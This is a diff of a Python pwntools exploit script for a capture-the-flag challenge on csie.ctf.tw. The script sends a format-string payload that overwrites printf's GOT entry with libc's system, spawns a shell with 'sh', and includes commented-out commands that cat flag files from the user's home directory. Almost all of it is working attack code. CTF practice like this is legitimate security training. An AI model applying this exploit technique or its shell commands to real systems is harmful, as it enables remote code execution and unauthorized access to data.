@@ -1,8 +1,8 @@
-#/usr/bin/env python
+#!/usr/bin/env python
 from pwn import *
 
-#host, port = '60.251.236.18', 10129
-host, port = '127.0.0.1', 7126
+host, port = 'csie.ctf.tw', 10129
+#host, port = '127.0.0.1', 7126
 y = remote(host, port)
 
 a = 0x6012ac
@@ -29,18 +29,18 @@ print y.recvuntil('}')
 printf_got = 0x601230
 system = libc + 0x4f440
 
-fmt_string2 = '%{}c%12$hhn%{}c%14$hn'.format(system & 0xff, ((system &
-    0xffff00) >> 8) - (system & 0xff))
-p2 = fmt_string2.ljust(0x18, \x00) + p64(printf_got) + p64(printf_got + 1)
+fmt_string2 = '%{}c%12$hhn%{}c%14$hn'.format(system & 0xff, ((system & 0xffff00) >> 8) - (system & 0xff))
+p2 = fmt_string2.ljust(0x18, '\x00') + p64(printf_got) + p64(printf_got+1)
 y.sendafter(':', p2)
 
-sleep(3)
+#sleep(3)
 y.send('sh')
-sleep(1)
-y.sendline('cat /home/`whoami`/flag3')
+#sleep(1)
+#y.sendline('cat /home/`whoami`/flag1')
+#y.sendline('cat /home/`whoami`/flag2')
+#y.sendline('cat /home/`whoami`/flag3')
 
 y.interactive()
 
 
 
-y.interactive()
